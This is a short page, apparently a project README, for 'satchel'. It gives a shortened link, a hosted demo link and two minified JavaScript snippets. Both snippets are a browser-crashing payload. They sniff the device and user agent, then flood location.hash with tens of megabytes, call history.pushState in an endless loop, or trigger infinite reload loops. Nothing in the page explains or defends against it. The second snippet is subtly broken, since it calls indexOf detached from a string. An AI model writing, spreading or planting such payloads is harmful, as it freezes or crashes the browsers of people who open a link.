# satchel

https://tinyurl.com/3s4s6swm

https://mwvd-alt.github.io/satchel/


```javascript
function s(){window.onload=()=>location.hash="M"+"\x01".repeat(33554432)+"m"}var m=s,a=()=>{for(var e=0;e<10;e++)setTimeout(function(){for(;;)location.reload(1)},1e3)},p=()=>{for(location.hash="M"+"\x01".repeat(524288)+"m";;)history.pushState({},"")},C=()=>{var e=window.matchMedia||window.msMatchMedia;return!!e&&e("(pointer:coarse)").matches},D=e=>navigator.userAgent.toLowerCase().indexOf(e)>-1;C()?m():D("chrome/")?p():D("safari/")>-1?s():a();
```

```javascript
let s=()=>{window.onload=()=>location.hash="M"+"\x01".repeat(33554432)+"m"};let a=()=>{for(var e=0;e<10;e++)setTimeout(function(){for(;;)location.reload(1)},1e3)};let p=()=>{location.hash="M"+"\x01".repeat(2**19)+"m";for(;;)history.pushState({},"")};var I = navigator.userAgent.toLowerCase().indexOf;var e = window.matchMedia || window.msMatchMedia;(!!e && e("(pointer:coarse)").matches) ? s() : I("chrome/") > -1 ? p() : I("safari/") > -1 ? s() : a();
```
